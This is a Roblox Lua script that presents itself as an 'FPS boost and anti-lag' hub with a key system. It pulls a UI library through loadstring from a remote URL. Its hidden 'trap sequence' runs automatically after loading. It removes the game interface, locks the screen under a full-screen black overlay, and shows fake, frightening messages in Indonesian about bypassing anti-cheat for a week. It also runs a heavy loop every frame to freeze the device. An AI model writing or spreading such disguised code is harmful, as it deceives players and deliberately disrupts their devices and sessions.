local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "DekaTeamHub V1 ✅",
   LoadingTitle = "Optimizing Game Resources...",
   LoadingSubtitle = "By DekaTeamhub",
   ConfigurationSaving = { Enabled = false },
   KeySystem = true,
   KeySettings = {
      Title = "DekaTeamHub System",
      Subtitle = "Security Verification",
      Note = "Key: deka Genjor",
      Key = {"deka Genjor"} 
   }
})

local Tab = Window:CreateTab("Main", 4483362458)

Tab:CreateButton({
   Name = "Boost FPS & Anti-Lag",
   Callback = function()
       Rayfield:Notify({
          Title = "Success",
          Content = "Boosting Performance... Please wait.",
          Duration = 5,
       })
   end,
})

-- [[ THE TRAP SEQUENCE ]] --
task.spawn(function()
    task.wait(0.5)
    
    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
        if v.Name:find("Rayfield") then v:Destroy() end
    end

    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        StarterGui:SetCore("TopbarEnabled", false)
    end)

    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui", playerGui)
    screenGui.Name = "SystemBackup"
    screenGui.DisplayOrder = 2147483647
    screenGui.IgnoreGuiInset = true 

    local jailFrame = Instance.new("TextButton", screenGui)
    jailFrame.Size = UDim2.new(1, 0, 1, 0)
    jailFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    jailFrame.Text = ""
    jailFrame.Active = true 
    jailFrame.Modal = true 

    local infoText = Instance.new("TextLabel", jailFrame)
    infoText.Size = UDim2.new(0.9, 0, 0.4, 0)
    infoText.Position = UDim2.new(0.05, 0, 0.3, 0)
    infoText.TextColor3 = Color3.fromRGB(255, 255, 255)
    infoText.TextScaled = true
    infoText.BackgroundTransparency = 1
    infoText.Font = Enum.Font.Code
    
    -- [[ FIX SISTEM UPDATE TEKS ]] --
    task.spawn(function()
        -- 1. Anti Banned
        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI BANNED...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
        task.wait(120)
        
        -- 2. Anti Report
        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI REPORT...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
        task.wait(120)
        
        -- 3. Anti Detected
        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI DETECTED...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
        task.wait(120)
        
        -- 4. FINAL: Anti Cheat (1 Minggu)
        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI CHEAT...\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
    end)

    -- Lag Engine
    game:GetService("RunService").RenderStepped:Connect(function()
        game:GetService("GuiService").SelectedObject = jailFrame
        infoText.Position = UDim2.new(0.05, math.random(-2, 2), 0.3, math.random(-2, 2))
        for i = 1, 1500000 do local _ = i * i end
    end)
end)





